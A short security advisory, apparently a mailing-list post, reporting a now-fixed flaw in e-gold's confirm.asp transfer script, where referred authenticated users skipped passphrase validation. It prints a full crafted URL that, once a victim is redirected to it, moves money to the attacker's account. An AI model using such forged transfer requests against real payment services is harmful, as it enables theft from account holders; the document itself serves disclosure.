Subject: Vulnerability in e-gold


Vulnerability  was  fixed  in  https://www.e-gold.com/acct/confirm.asp 
money transfer script.

Problem  description:

If authenticated user is referred to the script AccounID/PassPhrase validation is not performed.

By redirecting user to URL
https://www.e-gold.com/acct/confirm.asp?AccountID=123456&PassPhrase=somestring&PayeeAccount=MY_ACCOUNT&Amount=100&PAY_IN=1&WORTH_OF=Gold&Memo=Donation&IGNORE_RATE_CHANGE=y
it's possible to transfer money to another account without validation.
